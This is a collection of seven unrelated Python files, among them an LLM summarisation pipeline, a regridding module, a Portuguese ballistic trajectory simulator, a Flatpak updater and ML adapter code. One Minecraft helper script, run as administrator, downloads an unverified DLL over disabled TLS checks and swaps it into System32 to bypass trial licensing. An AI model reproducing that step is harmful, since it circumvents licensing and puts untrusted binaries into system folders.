    "# Named entity extraction\n\n# Packages\nfrom pathlib import Path\nimport sys\nimport os\nimport json\nimport time\nfrom datetime import datetime\n\n# Add packages to sys.path\nUTILITIES_RELATIVE_PATH = '../../'\nUTILITIES_ABSOLUTE_PATH = str((Path(__file__).parent / UTILITIES_RELATIVE_PATH).resolve())\nif UTILITIES_ABSOLUTE_PATH not in sys.path:\n    sys.path.append(UTILITIES_ABSOLUTE_PATH)\n\n# Custom packages\nfrom utilities.llm_response_handler_JSON import call_llm_and_return_JSON, initialise_llm, PROMPT_LIMIT\nfrom utilities.paper_access import get_text_from_section, get_text_from_paragraph, get_text\nfrom utilities.content_processor import tokenise_text\n\n\nMODULE ='m05'\nSTAGE = 1\n\nCURRENT_DIR = Path(__file__).parent.resolve()\nOLD_KG_PATH = CURRENT_DIR / f\"../m04_local_relation_extraction/kg_3.json\"\nNEW_KG_PATH = CURRENT_DIR / f\"kg_{STAGE}.json\"\nPROMPT_PATH = CURRENT_DIR / f\"prompt_{STAGE}_template.md\"\nPROMPT_EXAMPLE_PATH = CURRENT_DIR / f\"prompt_{STAGE}_examples.json\"\n\nTIME = datetime.now().strftime('%Y-%m-%d-%H-%M-%S')\nLOG_PATH = CURRENT_DIR / f\"./logs/{MODULE}_log_{STAGE}_{TIME}.txt\"\nTERMINAL_PATH = CURRENT_DIR / f\"./logs/{MODULE}_terminal_{STAGE}_{TIME}.txt\"\n\n\ndef run():\n\n\n    # =============================================================================\n    # Prepare the named entity extraction module\n\n    \"\"\"\n    Run the named entity extraction module\n    \"\"\"\n\n    start_time = time.time()\n\n    # Initialise the llm\n    llm = initialise_llm()\n\n    # Open the paper\n    with open(OLD_KG_PATH, \"r\") as f:\n        paper = json.load(f)\n\n\n    # Open the prompt template\n    with open(PROMPT_PATH, \"r\") as file:\n        prompt_template = file.read()\n\n    # Open the prompt example\n    with open(PROMPT_EXAMPLE_PATH, \"r\") as file:\n        prompt_example = json.load(file)\n\n    format_example = prompt_example[\"format_example\"]\n\n    file = open(LOG_PATH, \"w\")\n    terminal = open(TERMINAL_PATH, \"w\")\n\n\n    def prints(*args):\n        print(*args, file=terminal)\n        print(*args)\n\n    # =============================================================================\n    # Summarise the paper\n\n\n    # https://chatgpt.com/c/6710989b-58c4-8010-86a0-532a030eade7\n    def generate_section_order(num_sections):\n        mid = num_sections // 2\n        result = []\n        \n        for i in range(mid):\n            result.append(mid + i + 1)\n            result.append(mid - i)\n        if num_sections % 2 != 0:\n            result.append(mid + 1)\n        \n        return result\n    \n    # https://chatgpt.com/c/6710989b-58c4-8010-86a0-532a030eade7\n    def section_order_generator(num_sections):\n        order = generate_section_order(num_sections)\n        while True:\n            for section in order:\n                yield section - 1\n\n\n    def total_tokens(section_texts):\n        return sum([len(tokenise_text(section_text)) for section_text in section_texts])\n        \n    \n\n\n    gen = section_order_generator(len(paper[\"sections\"]))\n    target_tokens = PROMPT_LIMIT // 2\n    prints(f\"Target tokens: {target_tokens}\")\n    section_texts = []\n    for section in paper[\"sections\"]:\n        section_texts.append(get_text(section))\n\n\n    while total_tokens(section_texts) > target_tokens:\n\n        section_index = next(gen)\n\n        prints(f\"Current tokens: {total_tokens(section_texts)}\")\n        prints(f\"Summarising section {section_index + 1}\")\n\n\n        text = section_texts[section_index]\n\n        # Get the summary\n        prompt = prompt_template.format(\n            input_text=text, \n            format_example=json.dumps(format_example, indent=2)\n            )\n        \n        response, log, original_response = call_llm_and_return_JSON(llm, prompt)\n\n        if response is not None and \"summary\" in response:\n            summary = str(response[\"summary\"])\n            section_texts[section_index] = summary\n        else:\n            prints(\"Failed to get a summary. Maintaining the original text.\")\n\n        origianl_tokens_count = len(tokenise_text(text))\n        new_tokens_count = len(tokenise_text(section_texts[section_index]))\n\n        prints(f\"Original tokens in section {section_index + 1}: {origianl_tokens_count}\")\n        prints(f\"New tokens in section {section_index + 1}: {new_tokens_count}\")\n        prints(f\"Tokens saved: {origianl_tokens_count - new_tokens_count}\")\n\n        file.write(log)\n        file.write(\"\\n\\n\\n\\n\")\n        file.flush()\n\n    prints(\"Summarisation Finished. Total tokens:\", total_tokens(section_texts))\n    paper[\"summary\"] = \"\\n\\n\".join(section_texts)\n\n\n\n    # =============================================================================\n    # Tidy up and save the KG\n\n\n    finish_time = time.time() - start_time\n    prints(f\"Finished in {finish_time} seconds\")\n    if \"times\" not in paper:\n        paper[\"times\"] = []\n    paper[\"times\"].append(finish_time)\n\n\n    # Save the KG\n    with open(NEW_KG_PATH, \"w\") as f:\n        json.dump(paper, f, indent=2)\n\n    file.close()\n    terminal.close()\n\n\nif __name__ == \"__main__\":\n    run()",
    "\"\"\"\nThis module was adapted from https://github.com/CAB-LAB/gridtools\n\n                        The MIT License (MIT)\n\nCopyright (c) 2016, Brockmann Consult GmbH and contributors\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is furnished\nto do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\"\"\"\n\nfrom __future__ import annotations\n\nfrom itertools import groupby\nfrom math import floor, ceil\n\nimport dask.array as da\nimport numpy as np\n\nfrom dask.delayed import delayed\nfrom numba import prange\nfrom .utils import ngjit, ngjit_parallel\n\ntry:\n    import cupy\nexcept Exception:\n    cupy = None\n\n\n#: Interpolation method for upsampling: Take nearest source grid cell, even if it is invalid.\nUS_NEAREST = 10\n#: Interpolation method for upsampling: Bi-linear interpolation between the 4 nearest source grid\n# cells.\nUS_LINEAR = 11\n\n#: Aggregation method for downsampling: Take first valid source grid cell, ignore contribution\n# areas.\nDS_FIRST = 50\n#: Aggregation method for downsampling: Take last valid source grid cell, ignore contribution areas.\nDS_LAST = 51\n#: Aggregation method for downsampling: Take the minimum source grid cell value, ignore contribution\n# areas.\nDS_MIN = 52\n#: Aggregation method for downsampling: Take the maximum source grid cell value, ignore contribution\n# areas.\nDS_MAX = 53\n#: Aggregation method for downsampling: Compute average of all valid source grid cells,\n#: with weights given by contribution area.\nDS_MEAN = 54\n# DS_MEDIAN = 55\n#: Aggregation method for downsampling: Compute most frequently seen valid source grid cell,\n#: with frequency given by contribution area. Note that this mode can use an additional keyword\n# argument\n#: *mode_rank* which can be used to generate the n-th mode. See :py:function:`downsample_2d`.\nDS_MODE = 56\n#: Aggregation method for downsampling: Compute the biased weighted estimator of variance\n#: (see https://en.wikipedia.org/wiki/Mean_square_weighted_deviation), with weights given by\n# contribution area.\nDS_VAR = 57\n#: Aggregation method for downsampling: Compute the corresponding standard deviation to the biased\n# weighted estimator\n#: of variance\n#: (see https://en.wikipedia.org/wiki/Mean_square_weighted_deviation), with weights given by\n# contribution area.\nDS_STD = 58\n\n#: Constant indicating an empty 2-D mask\n_NOMASK2D = np.ma.getmaskarray(np.ma.array([[0]], mask=[[0]]))\n\n_EPS = 1e-10\n\nupsample_methods   = dict(nearest=US_NEAREST, linear=US_LINEAR)\n\ndownsample_methods = dict(first=DS_FIRST, last=DS_LAST, mode=DS_MODE,\n                          mean=DS_MEAN,   var=DS_VAR,   std=DS_STD,\n                          min=DS_MIN,     max=DS_MAX)\n\n\ndef map_chunks(in_shape, out_shape, out_chunks):\n    \"\"\"\n    Maps index in source array to target array chunks.\n\n    For each chunk in the target array this function computes the\n    indexes into the source array that will be fed into the regridding\n    operation.\n\n    Parameters\n    ----------\n    in_shape: tuple(int, int)\n      The shape of the input array\n    out_shape: tuple(int, int)\n      The shape of the output array\n    out_chunks: tuple(int, int)\n      The shape of each chunk in the output array\n\n    Returns\n    -------\n      Dictionary mapping of chunks and their indexes\n      in the input and output array.\n    \"\"\"\n    outy, outx = out_shape\n    cys, cxs = out_chunks\n    xchunks = list(range(0, outx, cxs)) + [outx]\n    ychunks = list(range(0, outy, cys)) + [outy]\n    iny, inx = in_shape\n    xscale = inx/outx\n    yscale = iny/outy\n    mapping = {}\n    for i in range(len(ychunks)-1):\n        cumy0, cumy1 = ychunks[i:i+2]\n        iny0, iny1 = cumy0*yscale, cumy1*yscale\n        iny0r, iny1r = floor(iny0), ceil(iny1)\n        y0_off, y1_off = iny0-iny0r, iny1r-iny1\n        for j in range(len(xchunks)-1):\n            cumx0, cumx1 = xchunks[j:j+2]\n            inx0, inx1 = cumx0*xscale, cumx1*xscale\n            inx0r, inx1r = floor(inx0), ceil(inx1)\n            x0_off, x1_off = inx0-inx0r, inx1r-inx1\n            mapping[(i, j)] = {\n                'out': {\n                    'x': (cumx0, cumx1),\n                    'y': (cumy0, cumy1),\n",
    "# Importando bibliotecas necess\u00e1rias\r\nimport math  # Para fun\u00e7\u00f5es matem\u00e1ticas (sqrt, radians, sin, cos, etc.)\r\nimport random  # Para gerar n\u00fameros aleat\u00f3rios\r\n\r\n# Fun\u00e7\u00e3o para gerar par\u00e2metros aleat\u00f3rios para a simula\u00e7\u00e3o\r\ndef gerar_parametros_aleatorios(distancia):\r\n    \"\"\"\r\n    Gera par\u00e2metros aleat\u00f3rios para a simula\u00e7\u00e3o, exceto a dist\u00e2ncia.\r\n\r\n    Par\u00e2metros:\r\n        distancia (float): Dist\u00e2ncia at\u00e9 o alvo em metros.\r\n\r\n    Retorna:\r\n        Uma tupla contendo:\r\n        - velocidade_inicial (float): Velocidade inicial do proj\u00e9til em m/s.\r\n        - peso_graos (float): Peso do proj\u00e9til em grains.\r\n        - bc (float): Coeficiente bal\u00edstico.\r\n        - densidade_ar (float): Densidade do ar em kg/m\u00b3.\r\n        - velocidade_vento (float): Velocidade do vento em m/s.\r\n        - direcao_vento_graus (float): Dire\u00e7\u00e3o do vento em graus.\r\n        - latitude_graus (float): Latitude em graus.\r\n        - gravidade (float): Acelera\u00e7\u00e3o devido \u00e0 gravidade em m/s\u00b2.\r\n    \"\"\"\r\n    # Gera uma velocidade inicial aleat\u00f3ria entre 700 e 900 m/s (intervalo t\u00edpico para proj\u00e9teis)\r\n    velocidade_inicial = random.uniform(700, 900)\r\n\r\n    # Gera um peso aleat\u00f3rio para o proj\u00e9til entre 150 e 180 grains (exemplo de faixa comum)\r\n    peso_graos = random.uniform(150, 180)\r\n\r\n    # Gera um coeficiente bal\u00edstico (BC) aleat\u00f3rio entre 0.4 e 0.6 (valores t\u00edpicos)\r\n    bc = random.uniform(0.4, 0.6)\r\n\r\n    # Gera uma densidade do ar aleat\u00f3ria entre 1.1 e 1.3 kg/m\u00b3 (varia com altitude e condi\u00e7\u00f5es)\r\n    densidade_ar = random.uniform(1.1, 1.3)\r\n\r\n    # Gera uma velocidade do vento aleat\u00f3ria entre 0 e 10 m/s\r\n    velocidade_vento = random.uniform(0, 10)\r\n\r\n    # Gera uma dire\u00e7\u00e3o do vento aleat\u00f3ria entre 0 e 360 graus\r\n    direcao_vento_graus = random.uniform(0, 360)\r\n\r\n    # Gera uma latitude aleat\u00f3ria entre -90 e 90 graus\r\n    latitude_graus = random.uniform(-90, 90)\r\n\r\n    # Define a acelera\u00e7\u00e3o devido \u00e0 gravidade (valor padr\u00e3o da Terra)\r\n    gravidade = 9.8\r\n\r\n    # Retorna todos os par\u00e2metros gerados\r\n    return velocidade_inicial, peso_graos, bc, densidade_ar, velocidade_vento, direcao_vento_graus, latitude_graus, gravidade\r\n\r\n\r\n# Fun\u00e7\u00e3o para calcular a trajet\u00f3ria do proj\u00e9til\r\ndef calcular_disparo_avancado(distancia, velocidade_inicial, peso_graos, bc, densidade_ar, velocidade_vento, direcao_vento_graus, latitude_graus, gravidade=9.8):\r\n    \"\"\"\r\n    Calcula a trajet\u00f3ria do proj\u00e9til considerando arrasto, vento e efeito de Coriolis.\r\n\r\n    Par\u00e2metros:\r\n        distancia (float): Dist\u00e2ncia at\u00e9 o alvo em metros.\r\n        velocidade_inicial (float): Velocidade inicial do proj\u00e9til em m/s.\r\n        peso_graos (float): Peso do proj\u00e9til em grains.\r\n        bc (float): Coeficiente bal\u00edstico.\r\n        densidade_ar (float): Densidade do ar em kg/m\u00b3.\r\n        velocidade_vento (float): Velocidade do vento em m/s.\r\n        direcao_vento_graus (float): Dire\u00e7\u00e3o do vento em graus.\r\n        latitude_graus (float): Latitude em graus.\r\n        gravidade (float): Acelera\u00e7\u00e3o devido \u00e0 gravidade em m/s\u00b2 (padr\u00e3o: 9.8).\r\n\r\n    Retorna:\r\n        Uma tupla contendo:\r\n        - z (float): Queda (altitude) do proj\u00e9til em metros.\r\n        - y (float): Desvio lateral do proj\u00e9til em metros.\r\n    \"\"\"\r\n    # Converte o peso do proj\u00e9til de grains para quilogramas\r\n    peso_kg = peso_graos * 0.0000647989\r\n\r\n    # Define o intervalo de tempo para a simula\u00e7\u00e3o (passo de integra\u00e7\u00e3o)\r\n    dt = 0.001\r\n\r\n    # Define a posi\u00e7\u00e3o inicial do proj\u00e9til (x, y, z)\r\n    x, y, z = 0, 0, 0\r\n\r\n    # Define a velocidade inicial do proj\u00e9til (vx, vy, vz)\r\n    vx, vy, vz = velocidade_inicial, 0, 0\r\n\r\n    # Loop para simular a trajet\u00f3ria at\u00e9 o proj\u00e9til atingir a dist\u00e2ncia do alvo\r\n    while x < distancia:\r\n        # Calcula a velocidade atual do proj\u00e9til\r\n        velocidade = math.sqrt(vx**2 + vy**2 + vz**2)\r\n\r\n        # Calcula a for\u00e7a de arrasto aerodin\u00e2mico\r\n        forca_arrasto = 0.5 * (peso_kg / bc) * densidade_ar * velocidade**2\r\n\r\n        # Calcula as componentes da acelera\u00e7\u00e3o devido ao arrasto\r\n        ax = -forca_arrasto * vx / velocidade\r\n        ay = -forca_arrasto * vy / velocidade\r\n        az = -forca_arrasto * vz / velocidade - gravidade\r\n\r\n        # Calcula as componentes do vento\r\n        direcao_vento_rad = math.radians(direcao_vento_graus)  # Converte graus para radianos\r\n        vento_x = velocidade_vento * math.cos(direcao_vento_rad)\r\n        vento_y = velocidade_vento * math.sin(direcao_vento_rad)\r\n\r\n        # Aplica o efeito do vento na acelera\u00e7\u00e3o (simplificado)\r\n        ay += vento_y / (peso_kg / gravidade)\r\n        ax += vento_x / (peso_kg / gravidade)\r\n\r\n        # Calcula o efeito de Coriolis\r\n        velocidade_angular_terra = 7.292e-5  # Velocidade angular da Terra em rad/s\r\n        latitude_rad = math.radians(latitude_graus)  # Converte latitude para radianos\r\n        desvio_coriolis = 2 * velocidade * math.sin(latitude_rad) * velocidade_angular_terra * dt\r\n        ay += desvio_coriolis  # Aplica o efeito de Coriolis na acelera\u00e7\u00e3o\r\n\r\n        # Atualiza a velocidade e a posi\u00e7\u00e3",
    "#\r\n# Verificar Permiss\u00e3o\r\n#\r\n\r\nimport ctypes\r\n\r\nif not ctypes.windll.shell32.IsUserAnAdmin():\r\n    raise PermissionError(\"Este script precisa ser executado como administrador.\")\r\n    input()\r\n\r\n#\r\n# Importa\u00e7\u00f5es\r\n#\r\n\r\nimport time, os, requests, shutil, urllib3\r\nfrom rich import print\r\nfrom zipfile import ZipFile\r\n\r\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\r\n\r\nprint('Importa\u00e7\u00f5es de terceiros carregada.')\r\n\r\n#\r\n# Visual\r\n#\r\n\r\nclass ascii:\r\n\r\n\tlogo = '''\r\n\tAUTOMATIZAR A INSTALA\u00c7\u00c3O DO:[red1]\r\n        \u2554\u2566\u2557\u252c\u250c\u2510\u250c\u250c\u2500\u2510\u250c\u2500\u2510\u252c\u2500\u2510\u250c\u2500\u2510\u250c\u2500\u2510\u250c\u252c\u2510\r\n        \u2551\u2551\u2551\u2502\u2502\u2502\u2502\u251c\u2524 \u2502  \u251c\u252c\u2518\u251c\u2500\u2524\u251c\u2524  \u2502 \r\n        \u2569 \u2569\u2534\u2518\u2514\u2518\u2514\u2500\u2518\u2514\u2500\u2518\u2534\u2514\u2500\u2534 \u2534\u2514   \u2534\r\n        \u2554\u2557 \u250c\u2500\u2510\u250c\u252c\u2510\u252c\u2500\u2510\u250c\u2500\u2510\u250c\u2500\u2510\u252c\u250c\u2500    \r\n        \u2560\u2569\u2557\u251c\u2524  \u2502\u2502\u251c\u252c\u2518\u2502 \u2502\u2502  \u251c\u2534\u2510    \r\n        \u255a\u2550\u255d\u2514\u2500\u2518\u2500\u2534\u2518\u2534\u2514\u2500\u2514\u2500\u2518\u2514\u2500\u2518\u2534 \u2534    [/red1]\r\n\r\n    [red1](1)[/red1] Instalar o [u]MCLauncher[/u]\r\n    [red1](2)[/red1] Remover a vers\u00e3o [u]Trial[/u] do Minecraft [yellow1](\u00e9 recomendado abrir o programa via powershell)[/yellow1]\r\n    [red1](3)[/red1] Sair\r\n    '''\r\n\r\nclass visual:\r\n    def Logger(texto):\r\n        print(time.strftime(f\"[bold dark_orange3][%H:%M:%S]:[/bold dark_orange3] {texto}\", time.localtime()))\r\n\r\n#\r\n# Fun\u00e7\u00f5es do menu\r\n#\r\n\r\ndef instalar_Launcher():\r\n    if not os.path.isfile('MCLauncher.zip'):\r\n        file = requests.get('https://github.com/MCMrARM/mc-w10-version-launcher/releases/download/0.4.0/MCLauncher.zip', verify = False)\r\n        if file.status_code == requests.codes.OK:\r\n            with open('MCLauncher.zip', 'wb') as MCLauncher:\r\n                    MCLauncher.write(file.content)\r\n            with ZipFile(\"MCLauncher.zip\", 'r') as launcher:\r\n                launcher.extractall(\"MCLauncher/\")\r\n            os.remove('MCLauncher.zip')\r\n            visual.Logger('Instalado com sucesso!')\r\n\r\ndef cheat_trial():\r\n\tdll = r\"C:\\Windows\\System32\\Windows.ApplicationModel.Store.dll\"\r\n\r\n\tif not os.path.exists('Windows.ApplicationModel.Store.dll'):\r\n\t\tdlltobypass = requests.get('https://github.com/makonhacolorida/mc-bedrock/raw/refs/heads/main/Windows.ApplicationModel.Store.dll', verify = False)\r\n\t\tif dlltobypass.status_code == requests.codes.OK:\r\n\t\t\twith open('Windows.ApplicationModel.Store.dll', 'wb') as DLL_PASS:\r\n\t\t\t\tDLL_PASS.write(dlltobypass.content)\r\n\t\t\tvisual.Logger('DLL Instalada!')\r\n\r\n\tvisual.Logger('Come\u00e7ando a inje\u00e7\u00e3o..')\r\n\r\n\ttry:\r\n\t\tif os.path.exists(dll):\r\n\t\t\tif not os.path.isdir(\"backup\"):\r\n\t\t\t\tos.mkdir(\"backup\")\r\n\r\n\t\t\tshutil.move(dll, os.getcwd() + '\\\\backup\\\\Windows.ApplicationModel.Store.dll.original')\r\n\r\n\t\t# Copiar a nova DLL para o System32\r\n\t\tshutil.copy(r\"Windows.ApplicationModel.Store.dll\", dll)\r\n\t\ttime.sleep(1)\r\n\t\tos.remove('Windows.ApplicationModel.Store.dll')\r\n\t\tvisual.Logger(f\"[bold red u]ByPass[/bold red u] Injetado com Sucesso!\")\r\n\r\n\texcept Exception as e:\r\n\t    visual.Logger(f\"Ocorreu um erro: {e}\")\r\n\r\n\r\n#\r\n# Menu\r\n#\r\n\r\nwhile True:\r\n\tos.system('cls')\r\n\tprint(ascii.logo)\r\n\r\n\topcao = input('>>> ')\r\n\r\n\tif(opcao == '1'):\r\n\t\tinstalar_Launcher()\r\n\t\tinput('Aperte alguma tecla para continuar')\r\n\r\n\tif(opcao == '2'):\r\n\t\tcheat_trial()\r\n\t\tinput('Aperte alguma tecla para continuar')\r\n\r\n\tif(opcao == '3'):\r\n\t\tprint('Bye Bye')\r\n\t\texit()\r\n\r\n\ttime.sleep(0.2)\r\n\r\n",
    "\"\"\"\nCopyright (c) 2024 - lihaohong6\nLicense: MIT\n\"\"\"\nimport re\nimport shutil\nimport subprocess\nfrom pathlib import Path\n\nimport requests\n\nflatpak_cargo_generator_path = Path(\"./flatpak-cargo-generator.py\")\n\ndef ensure_flatpak_cargo_generator_exists():\n    if flatpak_cargo_generator_path.exists():\n        return\n    url = \"https://raw.githubusercontent.com/flatpak/flatpak-builder-tools/refs/heads/master/cargo/flatpak-cargo-generator.py\"\n    res = requests.get(url)\n    with flatpak_cargo_generator_path.open(\"w\") as f:\n        f.write(res.text)\n\n\ndef cleanup_flatpak_cargo_generator():\n    flatpak_cargo_generator_path.unlink()\n\n\ndef update_rust_library(library: str, tag: str, out_path: str) -> None:\n    url = f\"https://raw.githubusercontent.com/{library}/refs/tags/{tag}/Cargo.lock\"\n    res = requests.get(url)\n    cargo_lock_path = Path(\"./cargo.lock\")\n    with cargo_lock_path.open(\"w\") as f:\n        f.write(res.text)\n    subprocess.run([\"python\",\n                    flatpak_cargo_generator_path,\n                    cargo_lock_path,\n                    \"-o\",\n                    out_path])\n    cargo_lock_path.unlink()\n\n\ndef get_tag(yaml_file: str, library: str) -> str:\n    return re.search(rf\"{library}.git.*\\n.*tag: (.*)\\n\", yaml_file).group(1)\n\n\ndef get_yaml_file_as_text() -> str:\n    yml_files = list(Path(\".\").rglob(\"*.yml\"))\n    result = []\n    for yml_file in yml_files:\n        if not yml_file.is_file():\n            continue\n        with yml_file.open(\"r\") as f:\n            result.append(f.read())\n    return \"\\n\".join(result)\n\n\ndef get_library_path(library_name: str) -> Path:\n    p = Path(f\"modules/{library_name}\")\n    p.mkdir(parents=True, exist_ok=True)\n    return p\n\n\ndef cargo_main():\n    ensure_flatpak_cargo_generator_exists()\n    yaml_file = get_yaml_file_as_text()\n    for library in (\"sxyazi/yazi\", \"ajeetdsouza/zoxide\", \"BurntSushi/ripgrep\", \"sharkdp/fd\"):\n        tag = get_tag(yaml_file, library)\n        library_name = library.split('/')[-1]\n        if library_name == \"yazi\":\n            target = f\"cargo-sources-{library_name}.json\"\n        else:\n            library_path = get_library_path(library_name)\n            target = library_path/ \"cargo-sources.json\"\n        update_rust_library(library, tag, target)\n    cleanup_flatpak_cargo_generator()\n\n\ndef golang_main():\n    yaml_file = get_yaml_file_as_text()\n    for library in (\"junegunn/fzf\", \"1player/host-spawn\"):\n        library_name = library.split('/')[-1]\n        library_path = get_library_path(library_name)\n        tag = get_tag(yaml_file, library)\n\n        clone_dir = Path(library_name)\n        subprocess.run([\"git\",\n                        \"clone\",\n                        \"--depth\", \"1\",\n                        \"--branch\", tag,\n                        f\"https://github.com/{library}\"])\n        subprocess.run([\"flatpak-go-mod\", clone_dir])\n        shutil.rmtree(clone_dir)\n\n        # First file produced by flatpak-go-mod: yml file containing all the dependencies. Need to move it.\n        Path(\"go.mod.yml\").rename(library_path / \"sources.yml\")\n\n        # Second file produced by flatpak-go-mod: modules.txt file. Just need t\n        Path(\"modules.txt\").rename(library_path / \"modules.txt\")\n\n\nif __name__ == \"__main__\":\n    cargo_main()\n    golang_main()",
    "import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom typing import Optional, List, Union, Tuple\n\nfrom transformers import LlamaForCausalLM\n\n\n\nclass KnowledgePrompting(nn.Module):\n    def __init__(\n        self,\n        model: LlamaForCausalLM,\n        kge_model: str = \"data/transe.pt\",\n        pretrain_emb_path = None,\n        adapter_type = \"mlp\"\n    ) -> None:\n        super(KnowledgePrompting, self).__init__()\n        self.llama_model = model\n        for param in self.llama_model.parameters():\n            param.requires_grad = False\n        pretrain_embeddings = torch.load(open(kge_model, \"rb\"))\n        if pretrain_emb_path is None:\n            self.embeddings = PretrainKGEmbedding(\n                pretrain_ent_embs=pretrain_embeddings,\n                dim_llm=4096,\n                adapter_type=adapter_type\n            )\n        else:\n            print(\"Adapter Load From {}\".format(pretrain_emb_path))\n            self.embeddings = torch.load(pretrain_emb_path)\n        print(self.embeddings)\n    \n    def forward(\n        self,\n        input_ids: torch.LongTensor = None,\n        attention_mask: Optional[torch.Tensor] = None,\n        position_ids: Optional[torch.LongTensor] = None,\n        past_key_values: Optional[List[torch.FloatTensor]] = None,\n        inputs_embeds: Optional[torch.FloatTensor] = None,\n        labels: Optional[torch.LongTensor] = None,\n        use_cache: Optional[bool] = None,\n        output_attentions: Optional[bool] = None,\n        output_hidden_states: Optional[bool] = None,\n        return_dict: Optional[bool] = None,\n        embedding_ids: torch.LongTensor = None\n    ):\n        kg_embeds = self.embeddings(embedding_ids)\n        batch_size, seq_len, _ = kg_embeds.shape\n        token_embeds = self.llama_model.model.embed_tokens(input_ids)\n        input_embeds = torch.cat((kg_embeds, token_embeds), dim=1)\n        prefix_labels = torch.full((batch_size, seq_len), fill_value=-100, dtype=torch.long)\n        new_labels = torch.cat((prefix_labels.cuda(), labels), dim=-1)\n        return self.llama_model(\n            input_ids=None,\n            attention_mask=None,\n            position_ids=position_ids,\n            past_key_values=past_key_values,\n            inputs_embeds=input_embeds,\n            labels=new_labels,\n            use_cache=use_cache,\n            output_attentions=output_attentions,\n            output_hidden_states=output_hidden_states,\n            return_dict=return_dict,\n        )\n\n\nclass PretrainKGEmbedding(nn.Module):\n    def __init__(\n        self,\n        pretrain_ent_embs,\n        dim_llm,\n        num_prefix = 1,\n        adapter_type = \"mlp\"\n    ):\n        super(PretrainKGEmbedding, self).__init__()\n        self.num_prefix = num_prefix\n        self.llm_dim = dim_llm\n        self.emb_dim = num_prefix * dim_llm\n        self.embeddings = nn.Embedding.from_pretrained(pretrain_ent_embs)\n        self.pretrain_dim = self.embeddings.weight.shape[1]\n        # Froze the pretrain embeddings\n        self.embeddings.requires_grad_(False)\n        self.adapter_type = adapter_type\n        if adapter_type == \"fc\":\n            self.adapter = nn.Linear(self.pretrain_dim, self.emb_dim)\n        elif adapter_type == \"mlp\":\n            self.adapter = nn.Sequential(\n                nn.Linear(self.pretrain_dim, 3 * self.emb_dim),\n                nn.ReLU(),\n                nn.Linear(3 * self.emb_dim, self.emb_dim)\n            )\n        elif adapter_type == \"moe\":\n            self.adapter = MoEAdaptorLayer(layers=[self.pretrain_dim, self.emb_dim])\n        elif adapter_type == \"qformer\":\n            self.adapter = QFormer(self.pretrain_dim, self.emb_dim)\n        elif \"mlp_\" in adapter_type:\n            # The scalability\n            num_layers = int(adapter_type.split('_')[-1])\n            self.adapter = nn.Sequential(\n                nn.Linear(self.pretrain_dim, 3 * self.emb_dim),\n                nn.ReLU(),\n            )\n            for _ in range(num_layers - 2):\n                self.adapter.append(nn.Linear(3 * self.emb_dim, 3 * self.emb_dim))\n                self.adapter.append(nn.ReLU())\n            self.adapter.append(nn.Linear(3 * self.emb_dim, self.emb_dim))\n        elif \"res_\" in adapter_type:\n            pass\n        else:\n            raise NotImplementedError\n    \n\n    def forward(self, triple_ids):\n        # main training stage\n        batch_size = triple_ids.shape[0]\n        num_token = triple_ids.shape[1]\n        ent = triple_ids.reshape(-1, num_token)\n        with torch.no_grad():\n            emb = self.embeddings(ent)\n        prefix = self.adapter(emb).reshape(batch_size, -1, self.llm_dim)\n        # print(prefix.shape)\n        return prefix\n\n\nclass PWLayer(nn.Module):\n    \"\"\"Single Parametric Whitening Layer\n    \"\"\"\n    def __init__(self, input_size, output_size, dropout=0.0):\n        super(PWLayer, self).__init__()\n\n        self.dropout = nn.Dropout(p=dropout)\n        self.bias = nn.Parameter(torch.zeros(input_size), requires_grad=True)\n        self.lin = nn.Linear(",
    "\nimport torch\nprint(torch.__version__)\nimport os\nfrom diffusers import StableDiffusionPipeline, StableDiffusionImg2ImgPipeline, StableDiffusionInpaintPipelineLegacy, DDIMScheduler, AutoencoderKL\nfrom PIL import Image\nimport datetime\n\n#from ip_adapter.ip_adapter_resample_input import IPAdapterPlusDual\nfrom ip_adapter import MultiPromptAdapter\n#from diffusers import DiffusionPipeline\nfrom diffusers import StableDiffusion3Pipeline\n\nbase_model_path = \"runwayml/stable-diffusion-v1-5\"\n#vae_model_path = \"stabilityai/sd-vae-ft-mse\"\n\n\ndef image_grid(imgs, rows, cols):\n    assert len(imgs) == rows*cols\n\n    w, h = imgs[0].size\n    grid = Image.new('RGB', size=(cols*w, rows*h))\n    grid_w, grid_h = grid.size\n    \n    for i, img in enumerate(imgs):\n        grid.paste(img, box=(i%cols*w, i//cols*h))\n    return grid\n\nnoise_scheduler = DDIMScheduler(\n    num_train_timesteps=1000,\n    beta_start=0.00085,\n    beta_end=0.012,\n    beta_schedule=\"scaled_linear\",\n    clip_sample=False,\n    set_alpha_to_one=False,\n    steps_offset=1,\n)\n#vae = AutoencoderKL.from_pretrained(vae_model_path).to(dtype=torch.float16)\n\n# load SD pipeline\npipe = StableDiffusionPipeline.from_pretrained(\n    base_model_path,\n#    scheduler=noise_scheduler,\n#    vae=vae,\n #   torch_dtype=torch.float16,\n    feature_extractor=None,\n    safety_checker=None\n)\npipe.enable_model_cpu_offload()\n\ndevice = \"cuda\" if torch.cuda.is_available() else \"cpu\"\nip_ckpt= \"models/MultiPrompt_15k.bin\"\nip_model = MultiPromptAdapter(pipe, ip_ckpt, device,num_tokens=32 )\n\nimages = ip_model.generate(prompt=\"river\",prompt_1=\"cat\",prompt_2=\"a banana\", num_samples=1, num_inference_steps=30, seed=45)\n\n#images = pipe(\n#    \"A cat holding a sign that says hello world\",\n#    negative_prompt=\"\",\n#    num_inference_steps=28,\n#    guidance_scale=7.0,\n#).images\n\ngrid = image_grid(images, 1, 1)\ntimestamp = datetime.datetime.now().strftime(\"%Y%m%d-%H%M%S\")\nsave_folder = 